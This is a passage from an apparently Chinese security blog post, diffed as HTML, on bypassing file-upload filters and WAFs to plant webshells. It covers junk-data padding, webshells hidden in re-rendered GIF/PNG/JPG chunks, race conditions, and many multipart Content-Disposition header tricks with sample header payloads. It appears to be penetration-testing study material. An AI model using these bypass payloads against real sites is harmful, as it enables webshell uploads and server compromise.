+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p>
+<p>构造一个大文件，前面1M的内容为==垃圾内容==，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验</p>
+<h6 id="二次渲染" class="heading-element"><span>0.0.0.2.4  二次渲染</span>
+  <a href="#%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的<code>imagecreatefromjpeg()</code>等函数），所以普通的图片马都难逃被渲染的悲剧。</p>
+<p>经常是白名单+二次渲染的情况下，我们二次渲染传入图片马再找包含或者解析漏洞。</p>
+<p><a href="https://www.cnblogs.com/1ink/p/15115240.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/1ink/p/15115240.html</a></p>
+</blockquote>
+<p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，</p>
+<p>将 Webshell 代码插在该部分，然后上传。具体实现需要自己编写 Python 程序，人工尝试基本是不可能构造出能绕过渲染函数的图片 webshell 的。</p>
+<ul>
+<li>
+<p>GIF</p>
+<pre tabindex="0"><code class="language-undefined" data-lang="undefined">渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可</code></pre></li>
+<li>
+<p>PNG</p>
+<pre tabindex="0"><code class="language-undefined" data-lang="undefined">PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块</code></pre></li>
+<li>
+<p>JPG</p>
+<pre tabindex="0"><code class="language-mipsasm" data-lang="mipsasm">JPG 需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试 </code></pre></li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/2657#toc-12"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/2657#toc-12</a></li>
+<li><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/"target="_blank" rel="external nofollow noopener noreferrer">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></li>
+</ul>
+<h5 id="其他" class="heading-element"><span>0.0.0.3  其他</span>
+  <a href="#%e5%85%b6%e4%bb%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="条件竞争" class="heading-element"><span>0.0.0.3.1  条件竞争</span>
+  <a href="#%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>利用条件竞争删除文件时间差绕过。</li>
+<li>在脚本运行的时候，访问 Webshell</li>
+</ul>
+<h6 id="绕waf" class="heading-element"><span>0.0.0.3.2  绕WAF</span>
+  <a href="#%e7%bb%95waf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><ul>
+<li>在恶意代码前加==垃圾数据==；</li>
+<li>在数据包前加垃圾数据；</li>
+<li>在Content-Disposition参数后面加垃圾数据；</li>
+<li>==多加一个filename==；</li>
+<li>==更改HTTP请求方法==；</li>
+<li>==双写后缀==</li>
+<li>删除实体里面的Conten-Type字段；
+第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</li>
+<li>删除Content-Disposition字段里的空格</li>
+<li>增加一个空格</li>
+<li>修改Content-Disposition字段值的大小写</li>
+<li>文件名后缀处回车</li>
+<li>多个Content-Disposition</li>
+</ul>
+<p>####### 多个filename</p>
+<p>早期版本安全狗，可以多加一个filename</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;test.txt&#34;; filename=&#34;test.php&#34;</code></pre><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
+<p>####### 交换name和filename的顺序</p>
+<p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; filename=&#34;xx.php&#34;; name=file_x</code></pre><p>####### 去掉引号,双引号变成单引号</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=file_x; filename=&#34;xx.php&#34;
+Content-Disposition: form-data; name=file_x; filename=xx.php
+Content-Disposition: form-data; name=&#34;file_x&#34;; filename=xx.php
+Content-Disposition: form-data; name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><p>单引号、双引号、不要引号，都能上传。</p>
+<p>####### 大小写</p>
+<p>对这三个固定的字符串进行大小写转换</p>
+<ul>
+<li>
+<p>Content-Disposition</p>
+</li>
+<li>
+<p>name</p>
+</li>
+<li>
+<p>filename</p>
+</li>
+</ul>
+<p>####### 空格</p>
+<p>在: ; =添加1个或者多个空格。</p>
+<p>####### 去掉或修改Content-Disposition值</p>
+<p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p>
+<pre tabindex="0"><code>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><p>####### 多个boundary</p>
+<p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
+<pre tabindex="0"><code>------WebKitFormBoundaryj1oRYFW91eaj8Ex2
+Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;test.txt&#34;
+Content-Type: text/javascript
+
+------WebKitFormBoundaryj1oRYFW91eaj8Ex2
+Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;test.php&#34;
+Content-Type: text/javascript</code></pre><p>####### 多个分号</p>
+<p>文件解析时，可能解析不到文件名，导致绕过。</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;;;; filename=&#34;test.php&#34;</code></pre><p>####### Header在boundary前添加任意字符</p>
+<p>PHP支持，JAVA报错</p>
+<pre tabindex="0"><code>Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</code></pre><p>####### filename换行</p>
+<p>PHP支持，Java不支持</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;; file
+name=&#34;test.php&#34;</code></pre><p>####### name和filename添加任意字符串</p>
+<p>PHP支持，Java不支持</p>
+<pre tabindex="0"><code>Content-Disposition: name=&#34;file_x&#34;; bypass waf upload; filename=&#34;test.php&#34;;</code></pre><p>####### POST/GET</p>
+<p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。
+此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-tag" title="Tags - 文件上传">文件上传</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/113/" class="post-nav-item" rel="prev" title="文件包含-LFI_Tricks"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>文件包含-LFI_Tricks</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/37/" class="post-nav-item" rel="next" title="应急响应-日志分析">应急响应-日志分析<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
